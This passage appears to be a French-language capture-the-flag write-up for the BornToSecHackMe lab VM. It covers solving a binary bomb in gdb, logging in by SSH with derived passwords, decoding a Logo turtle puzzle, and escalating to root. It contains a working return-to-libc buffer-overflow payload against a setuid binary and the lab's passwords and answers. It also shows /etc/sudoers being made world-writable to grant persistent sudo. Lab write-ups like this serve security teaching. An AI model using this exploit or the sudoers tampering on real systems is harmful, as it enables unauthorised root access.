ou chaque entier doit être inférieur ou égal à 6
et où aucun entier ne doit être le même qu'un autre entier

après avoir testé avec 1 2 3 4 5 6 et mis un breakpoint a phase_6 on fait 
(gdb) until *0x08048e75 car on arrive précisément au dernier opérateur de contrôle qui boucle à cinq reprises

0x08048e70 <+216>:	mov    0x8(%esi),%edx
   0x08048e73 <+219>:	mov    (%esi),%eax
=> 0x08048e75 <+221>:	cmp    (%edx),%eax
   0x08048e77 <+223>:	jge    0x8048e7e <phase_6+230>
   0x08048e79 <+225>:	call   0x80494fc <explode_bomb>
   0x08048e7e <+230>:	mov    0x8(%esi),%esi
   0x08048e81 <+233>:	inc    %edi
   0x08048e82 <+234>:	cmp    $0x4,%edi

Voici l'instruction conditionnelle en elle-même. Tout d'abord, le contenu de %esi + 8 à été déplacé dans %edx. 
Par la suite, %esi lui - même est déplacé dans %eax. 
Ensuite, %eax est comparé à %edx.

Si la valeur de %edx (qui est %esi + 0x8) est inférieure à la valeur à %eax(qui est %esi) alors la bombe explose.


Lorsque nous examinons le contenu de %esi et %esi + 0x8, nous obtenons quelques structures appelées <node1>et <node2>. Chaque nœud a trois éléments. Le deuxième élément correspond ici évidemment au numéro du nœud lui-même : 1 pour <node1>, 2 pour <node2>

(gdb) x/x $esi
0x804b26c <node1>:	0x000000fd


(gdb) x/3x $esi
0x804b26c <node1>:	0x000000fd	0x00000001	0x0804b260
(gdb) x/x $esi
0x804b26c <node1>:	0x000000fd
(gdb) x/3x *($esi + 8)
0x804b260 <node2>:	0x000002d5	0x00000002	0x0804b254
(gdb) x/3x *(*($esi + 8) + 8)
0x804b254 <node3>:	0x0000012d	0x00000003	0x0804b248
(gdb) x/3x *(*(*($esi + 8) + 8) + 8)
0x804b248 <node4>:	0x000003e5	0x00000004	0x0804b23c
(gdb) x/3x *(*(*(*($esi + 8) + 8) + 8) + 8)
0x804b23c <node5>:	0x000000d4	0x00000005	0x0804b230
(gdb)

Le troisième élément du nœud ressemble à un pointeur. Lorsque nous vérifions le contenu de %esi + 0x8, puis de ((%esi + 0x8) + 0x8), et ainsi de suite en faisant des soustraction entre hexa nous constatons que ces pointeurs diminuent 0x8à la fois. Étant donné que la première colonne de valeurs semble être arbitraire, cela commence à ressembler à une structure de données commune : une liste (simplement) chaînée. La première colonne est la valeur du nœud, la deuxième colonne est la position du nœud dans la liste et la troisième colonne est le pointeur vers le nœud suivant dans la liste.

Alors maintenant, nous savons, lorsque nous comparons %edx et %eax à <phase_6+221>, ce que nous faisons en fait, c'est comparer la valeur du nœud actuel de la liste chaînée à la valeur du nœud suivant dans la liste. Si la valeur du nœud suivant n'est pas inférieure à la valeur du nœud actuel, la bombe explose. En d'autres termes, nous devons classer les nœuds de la plus grande valeur à la plus petite valeur. Comment faisons-nous cela?


0x000000fd node1
0x000002d5 node 2
0x0000012d	node 3
0x000003e5 node 4
0x000000d4 node 5
0x000001b0 node 6

voici l’ordre du plus grand au plus petit
node 4
node 2
node 6
node 3
node 1
node 5

soit 4 2 6 3 1 5


laurie@BornToSecHackMe:~$ ./bomb
Welcome this is my little bomb !!!! You have 6 stages with
only one life good luck !! Have a nice day!
Public speaking is very easy.
Phase 1 defused. How about the next one?
1 2 6 24 120 720
That's number 2.  Keep going!
1 b 214
Halfway there!
9
So you got that one.  Try this one.
opekmq
Good work!  On to the next...
4 2 6 3 1 5
Congratulations! You've defused the bomb!

ainsi l’ensemble des réponse est 

Public speaking is very easy.
1 2 6 24 120 720
1 b 214
9
opekmq
4 2 6 3 1 5


When you have all the password use it as "thor" user with ssh.

soit thor et Publicspeakingisveryeasy.126241207201b2149opekmq426135

~/Desktop ssh thor@192.168.56.102 -p 22
        ____                _______    _____
       |  _ \              |__   __|  / ____|
       | |_) | ___  _ __ _ __ | | ___| (___   ___  ___
       |  _ < / _ \| '__| '_ \| |/ _ \\___ \ / _ \/ __|
       | |_) | (_) | |  | | | | | (_) |___) |  __/ (__
       |____/ \___/|_|  |_| |_|_|\___/_____/ \___|\___|

                       Good luck & Have fun
thor@192.168.56.102's password:
thor@BornToSecHackMe:~$

et nous voici sur la session de Thor !!!!

on trouve un README
- Finish this challenge and use the result as password for 'zaz' user.

on atteint un fichier turtle 

on ne parvient pas a l’ executer 
après des recherches on découvre que c’est une tortue graphique  :

Une tortue graphique est une manière bien connue et intuitive pour initier les enfants au monde de la programmation. Un tel module faisait partie initialement du langage de programmation Logo créé par Wally Feurzig et Seymout Papert en 1967.

on trouve un interpréter de langage jslogo 
https://www.calormen.com/jslogo/

le problème c’est que les instructions du fichier turtle sont en français et on va devoir les traduire en anglais pour qu’elles puissent être interprétés

:%s/Tourne gauche/left/g

:%s/Tourne droite/right/g

%s/Avance/forward/g

%s/Recule/back/g

:%s/de//g

:%s/grees/degrees/g
:%s/degrees//g
:%s/spaces//g

après un scp thor@192.168.56.102:/home/thor/turtle /Users/blsegal/Desktop
on copie le document modifie pour le mettre dans l’interpréteur 

on trouve le S L A S H 

la phrase a la fin Can you digest the message? :) nous donne un indice 
 (Message Digest pour MD5)

après avoir haché SLASH on trouve 
646da671ca01bb5d84dbb5fb2238dc8e

si on fait maintenant 


ssh zaz@192.168.56.102 -p 22 et 646da671ca01bb5d84dbb5fb2238dc8e
on est bien sur la session de zaz !!!

on trouve un fichier exploit_me

file exploit_me nous apprend que exploit_me est setuid et not stripped ce qui nous arrange beaucoup !
exploit_me: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x2457e2f88d6a21c3893bc48cb8f2584bcd39917e, not stripped

setuid est un bit de controle d'accès appliqués aux fichiers et répertoires sous unix;
Grâce à lui, un processus exécutant un tel fichier peut s'exécuter au nom d'un autre utilisateur
par exemple quand un fichier exécutable est la propriété de l’utilisateur root et est rendu setuid, tout processus exécutant ce fichier peut effectuer ses tâches avec les permissions associées à root. (ce qui constitue un risque de sécurité que l’on peut essayer d’exploiter)
après un ls -la on a bien exploit_me setuid en root 

on va pouvoir regarder avec gdb exploit_me

0x08048400 <+12>:	cmpl   $0x1,0x8(%ebp)
notre programme attend un argument 

  0x08048420 <+44>:	call   0x8048300 <strcpy@plt>
cette ligne nous intéresse énormément car la fonction strcpy est vulnérable aux attaques de type buffer overflow 
strcpy ne vérifie pas que la taille de l’argument correspond à celui du buffer de destination 
ce dépassement va potentiellement écraser la sauvegarde du registre EIP (sauvegarde effectuée afin que lorsque la fonction en cours se termine, le processeur retrouve l’adresse de l’instruction suivant l’appel de cette fonction), donc comme EIP est partiellement ou totalement écrasé, les chances sont fortes pour que cette nouvelle valeur pointe soit vers une zone mémoire non autorisée en lecture, soit vers une zone mémoire contenant des instructions non valides.

Cependant, si l’attaquant fourni une adresse mémoire soigneusement choisie pour pointer vers un code malveillant placé dans le buffer, alors le flow d’exécution du programme peut être modifié, et on va pouvoir faire une escalade de privilèges 
via attaque de type return to lib c 
L’idée est d’utiliser des fonctions déjà programmée, contenues dans la libc, à notre avantage comme strcpy 
nous allons appeler directement la fonction system() de la libc, en lui fournissant comme argument la chaine de caractère "/bin/sh"



après avoir fait un certain nombre de test sur l’entrée standard on aperçoit que nous n’avons pas un segfault mais un Illegal instruction (core dumped) lorsque l’input contient 140 caractères ! 

zaz@BornToSecHackMe:~$ ./exploit_me aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Illegal instruction (core dumped)

pour mener a bien notre attaque return to lib c il nous reste a connaitre l'adresse de <system>
celle d'exit pour plus de propreté mais ce n'est pas indispensable et surtout l'adresse de /bin/sh

(gdb) p system
$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
(gdb) p exit
$2 = {<text variable, no debug info>} 0xb7e5ebe0 <exit>
(gdb)

(gdb find &system,+9999999,"/bin/sh"
0xb7f8cc58

(Cette commande effectue une recherche dans une plage mémoire commençant au début de la fonction __libc_start_main() (appelée avant notre fonction main), et d’une taille de 99 999 999 octets (Pour être sûr).

il nous reste maintenant a faire la conversion endian et a executer cette commande :

zaz@BornToSecHackMe:~$ ./exploit_me `python -c "print('0' * 140 + '\x60\xb0\xe6\xb7' + '\xe0\xeb\xe5\xb7' + '\x58\xcc\xf8\xb7')"`

on a un terminal root comme le prouve la commande whoami désormais on peut changer le chmod de /etc/sudoers afin d'ajouter tout les privilèges à zaz et ainsi avoir :
 
root@BornToSecHackMe:/home/zaz# id
uid=0(root) gid=0(root) groups=0(root)

on fait chmod 666 /etc/sudoers
on ajoute cette ligne :
zaz     ALL=(ALL:ALL) ALL
dans la rubrique user privilege specification


ensuite la commande sudo su nous indique sudo: /etc/sudoers is mode 0666, should be 0440

chmod 440 /etc/sudoers

et on peut désormais faire exit puis : 

zaz@BornToSecHackMe:~$ sudo su
[sudo] password for zaz:
root@BornToSecHackMe:/home/zaz# id
uid=0(root) gid=0(root) groups=0(root)

et on est root !